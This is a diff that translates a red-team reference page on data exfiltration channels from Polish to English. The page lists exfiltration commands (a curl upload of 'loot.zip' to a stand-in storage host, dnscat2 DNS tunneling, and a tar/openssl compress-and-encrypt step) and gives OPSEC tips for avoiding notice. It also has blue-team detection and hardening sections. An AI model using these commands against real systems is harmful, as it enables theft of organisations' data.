@@ -1,5 +1,5 @@
 ---
-title: "Kanały exfiltracji danych"
+title: "Data exfiltration channels"
 category: "red-team"
 tags: ["exfiltration", "data-theft"]
 platform: "agnostic"
@@ -9,44 +9,44 @@ updated: "2026-07-11"
 author: "core"
 ---
 
-# Kanały exfiltracji
+# Exfiltration channels
 
 ## TL;DR
-Wyprowadzanie danych ukrytymi kanałami: DNS, HTTPS do zaufanych usług, ICMP, kanałem C2. Kompresuj + szyfruj + dziel na kawałki.
+Getting data out through covert channels: DNS, HTTPS to trusted services, ICMP, the C2 channel. Compress + encrypt + chunk.
 
-## Techniki
+## Techniques
 ```bash
-# HTTPS do zaufanej usługi (blends in)
+# HTTPS to a trusted service (blends in)
 curl -X POST --data-binary @loot.zip https://storage.example.com/up
 
-# DNS tunneling (małe porcje w subdomenach)
+# DNS tunneling (small chunks in subdomains)
 # iodine / dnscat2
 dnscat2-server corp.local
 dnscat2 --dns server=10.10.14.1,domain=corp.local
 
 # ICMP
-# hping3 / ptunnel do przemytu w payloadzie echo
+# hping3 / ptunnel to smuggle in the echo payload
 
-# Przygotowanie: kompresja + szyfrowanie + chunk
+# Prep: compress + encrypt + chunk
 tar czf - /data | openssl enc -aes-256-cbc -pbkdf2 -k 'key' | split -b 1M - chunk_
 ```
 
 ## OPSEC
-- Throttle (limit pasma), godziny robocze, zaufane domeny/CDN.
-- Unikaj wielkich pojedynczych transferów — rozłóż w czasie.
+- Throttle (bandwidth limit), business hours, trusted domains/CDNs.
+- Avoid large single transfers — spread over time.
 
-## Wykrywanie (Blue Team)
+## Detection (Blue Team)
 ```text
-DNS   – długie/losowe subdomeny, wysoka liczba TXT/NULL, jeden host->wiele zapytań
-HTTPS – duży upload do świeżych/nietypowych domen, anomalia wolumenu wychodzącego
-ICMP  – nietypowo duże/echa z payloadem
-DLP   – wzorce danych wrażliwych (PII/PAN) w ruchu wychodzącym
+DNS   – long/random subdomains, high volume of TXT/NULL, one host->many queries
+HTTPS – large upload to fresh/unusual domains, outbound volume anomaly
+ICMP  – unusually large echoes with payload
+DLP   – sensitive data patterns (PII/PAN) in outbound traffic
 ```
 
-## Mitygacja / Hardening
-- DLP, egress filtering, proxy z inspekcją i logowaniem.
-- Ogranicz DNS wychodzący do wewnętrznych resolverów; alert na tunelowanie.
-- Blokada kategorii/CDN nieużywanych biznesowo.
+## Mitigation / Hardening
+- DLP, egress filtering, an inspecting and logging proxy.
+- Restrict outbound DNS to internal resolvers; alert on tunneling.
+- Block categories/CDNs not used for business.
 
-## Źródła
+## Sources
 - [MITRE Exfiltration](https://attack.mitre.org/tactics/TA0010/)
